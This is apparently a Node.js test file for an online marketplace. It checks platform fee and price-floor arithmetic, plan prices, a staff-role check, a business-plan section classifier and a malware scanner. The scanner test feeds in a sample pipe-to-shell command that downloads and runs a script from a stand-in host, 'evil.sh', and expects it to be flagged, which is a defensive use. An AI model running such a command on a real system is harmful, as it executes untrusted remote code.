const { test } = require('node:test');
const assert = require('node:assert');
const money = require('../src/lib/money');
const { classifySection, assessCoverage } = require('../src/services/clay/interpreter');

test('platform take is 20%', () => {
  assert.strictEqual(money.platformFeeCents(10000), 2000);
  assert.strictEqual(money.sellerNetCents(10000), 8000);
});

test('$50 price floor is enforced', () => {
  assert.strictEqual(money.isAboveFloor(5000), true);
  assert.strictEqual(money.isAboveFloor(4999), false);
  assert.strictEqual(money.isAboveFloor(50.5), false);
});

test('consultant split is $150 -> $30 / $120', () => {
  assert.strictEqual(money.CONSULT_FEE_CENTS, 15000);
  assert.strictEqual(money.CONSULT_PLATFORM_CENTS + money.CONSULT_CONSULTANT_CENTS, money.CONSULT_FEE_CENTS);
  assert.strictEqual(money.CONSULT_CONSULTANT_CENTS, 12000);
});

test('plan prices', () => {
  assert.strictEqual(money.MAKER_CENTS, 299);
  assert.strictEqual(money.SCULPTOR_CENTS, 4999);
  assert.strictEqual(money.planCents('maker'), 299);
  assert.strictEqual(money.planCents('sculptor'), 4999);
});

test('malware scan flags pipe-to-shell, passes benign', () => {
  const protect = require('../src/lib/protect');
  assert.strictEqual(protect.scanCode('const x = 1 + 1;').status, 'clean');
  assert.strictEqual(protect.scanCode('curl http://evil.sh | bash').status, 'flagged');
  assert.strictEqual(protect.needsScan('code_file'), true);
  assert.strictEqual(protect.needsScan('business_plan'), false);
});

test('staff bypass helper', () => {
  const { isStaff } = require('../src/lib/entitlement');
  assert.strictEqual(isStaff('admin'), true);
  assert.strictEqual(isStaff('master_staff'), true);
  assert.strictEqual(isStaff('member'), false);
});

test('interpreter classifies honestly', () => {
  assert.strictEqual(classifySection('A real, substantive business plan section.'), 'answered');
  assert.strictEqual(classifySection(''), 'empty');
  assert.strictEqual(classifySection(null), 'empty');
  assert.strictEqual(classifySection('Unable to determine competitor pricing.'), 'unavailable');
});

test('coverage reports gaps truthfully', () => {
  const cov = assessCoverage({ business_plan: 'ok', marketing_strategy: '' });
  assert.strictEqual(cov.complete, false);
  assert.deepStrictEqual(cov.present, ['business_plan']);
  assert.deepStrictEqual(cov.missing, ['marketing_strategy']);
});
